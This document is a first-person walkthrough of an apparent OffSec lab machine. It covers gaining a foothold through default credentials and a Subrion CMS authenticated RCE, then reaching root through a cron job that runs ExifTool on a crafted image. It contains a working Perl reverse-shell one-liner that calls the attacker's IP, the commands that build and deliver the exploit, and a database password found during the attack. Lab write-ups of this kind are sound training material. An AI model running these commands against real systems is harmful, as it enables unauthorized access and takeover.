`nmap -A -T4 -p- 192.168.225.163`

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c1:99:4b:95:22:25:ed:0f:85:20:d3:63:b4:48:bb:cf (RSA)
|   256 0f:44:8b:ad:ad:95:b8:22:6a:f0:36:ac:19:d0:0e:f3 (ECDSA)
|_  256 32:e1:2a:6c:cc:7c:e6:3e:23:f4:80:8d:33:ce:9b:3a (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Did not follow redirect to http://exfiltrated.offsec/
| http-robots.txt: 7 disallowed entries 
| /backup/ /cron/? /front/ /install/ /panel/ /tmp/ 
|_/updates/
|_http-server-header: Apache/2.4.41 (Ubuntu)
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 8888/tcp)
HOP RTT      ADDRESS
1   48.05 ms 192.168.45.1
2   48.04 ms 192.168.45.254
3   48.77 ms 192.168.251.1
4   48.83 ms 192.168.225.163
```

In the output with have a DNS name that we can add to /etc/hosts. Along with some robots.txt entries that we can look into.

```
User-agent: *
Disallow: /backup/
Disallow: /cron/?
Disallow: /front/
Disallow: /install/
Disallow: /panel/
Disallow: /tmp/
Disallow: /updates/
```

Looking at some of the disallowed directories, some interesting ones like `/panel/` and `/install/` stand out to me.

In `/panel/` we get a login panel and test default `admin:admin` and get a successful authentication

![](Images/Pasted%20image%2020250509103845.png)

![](Images/Pasted%20image%2020250509103855.png)

This is `Subrion CMS v 4.2.1` so we can use that in our enumeration. Which we can quickly find a Authenticated RCE for this version [here](https://github.com/hev0x/CVE-2018-19422-SubrionCMS-RCE) lets adapt that and run it.

After running the POC we establish a web shell with the target.

![](Images/Pasted%20image%2020250509104207.png)

Lets try and establish a normal shell as webshells would not count for credit.

```
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.45.244:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

This allowed us to establish a normal tty shell.

![](Images/Pasted%20image%2020250509105527.png)

The home directory of the user coaran is empty so I assume we just need to find escalation to the root proof. 

Beginning with some light manual directory enumeration. Within the Web Server directory is an `admin` directory which contains `adminer.php` which upon opening contains some additional detail but it doesn't contain a password. We could try with an empty password?

```
    $_GET['username'] = INTELLI_DBUSER;
    $_GET['server'] = INTELLI_DBHOST;
    $_GET['db'] = INTELLI_DBNAME;
    $_GET['driver'] = INTELLI_CONNECT;

INTELLI_DBUSER:
```

Lets see if the pass is anywhere in the directory structure.

```
grep -r "INTELLI_DBPASS" .
```

We end up finding the following

```
./includes/config.inc.php:define('INTELLI_DBPASS', 'target100');
```

Lets go check that file to see if its for the same user. It is not but we have found credentials

```
define('INTELLI_CONNECT', 'mysqli');
define('INTELLI_DBHOST', 'localhost');
define('INTELLI_DBUSER', 'subrionuser');
define('INTELLI_DBPASS', 'target100');
define('INTELLI_DBNAME', 'subrion');
define('INTELLI_DBPORT', '3306');
define('INTELLI_DBPREFIX', 'sbr421_');
```

Using these credentials we get access to the DB. After enumerating the DB this seems to be a misleading rabbit hole. Lets just transfer Linpeas over and do some automated enumeration.

In the output we find a cronjob running a script.

![](Images/Pasted%20image%2020250509110903.png)

Lets check that out and see if we can add a bash script to catch a shell as root. 

![](Images/Pasted%20image%2020250509110933.png)

I can't edit the file but searching on google found something promising [here](https://www.exploit-db.com/exploits/50911) which leverages ExifTool for local priv esc. We will use the POC to create a malicious file to be executed by the image-exif.sh script.

![](Images/Pasted%20image%2020250509111330.png)

![](Images/Pasted%20image%2020250509111636.png)

Looks like we can just generate the payload with the `-s` operator. 

```
python3 exifpoc.py -s 192.168.45.244 22
```

![](Images/Pasted%20image%2020250509112850.png)

Now we can upload the malicious jpg to be executed by the root scheduled task.

```
python3 -m http.server 80
nc -lvnp 22

wget 192.168.45.244/image.jpg (into uploads directory)
```

Lets wait to see if it establishes a shell. That didn't appear to get execution? Do we have to upload it through the proper upload field in the admin panel? Maybe it doesn't like the port so lets try another. Changing the port also didn't seem to do anything either. Lets try resetting the instance and try again.

Attempting after reset, creating the shell for port 80 and uploading it through `panel/uploads` gets us our shell.

![](Images/Pasted%20image%2020250509114439.png)

Turns out there was a local.txt that my initial shell didn't see when I did a `dir /home/coaran` anyways we have root now so we can grab that one too.

![](Images/Pasted%20image%2020250509114622.png)




